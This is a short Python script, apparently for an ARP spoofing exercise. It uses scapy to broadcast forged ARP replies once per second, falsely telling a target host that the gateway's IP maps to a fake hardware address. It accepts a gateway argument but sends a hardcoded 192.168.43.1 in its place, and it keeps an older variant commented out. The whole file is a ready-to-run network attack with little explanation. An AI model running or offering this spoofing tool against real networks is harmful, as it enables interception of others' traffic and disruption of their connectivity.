import sys
from time import sleep
from scapy.all import send, Ether, ARP


if __name__ == '__main__':

    if len(sys.argv) != 3:
        print('usage: python3 arp_spoofing.py <TARGET> <GATEWAY>')
        exit(0)

    poor_client_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    my_hardware = '11:11:11:11:11:11'

    # Build arp packages
    #
    # attacker > poor_client
    """
    arp_poor_client = ARP(op='who-has')

    arp_poor_client.psrc = gateway_ip
    arp_poor_client.hwsrc = my_hardware

    arp_poor_client.pdst = poor_client_ip
    arp_poor_client.hwdst = 'ff:ff:ff:ff:ff:ff'
    """
    arp_poor_client = ARP(op='is-at')

    arp_poor_client.psrc = '192.168.43.1'
    arp_poor_client.hwsrc = my_hardware

    arp_poor_client.pdst = poor_client_ip
    arp_poor_client.hwdst = 'ff:ff:ff:ff:ff:ff'
 

    while(1):
        send(arp_poor_client)

        sleep(1)



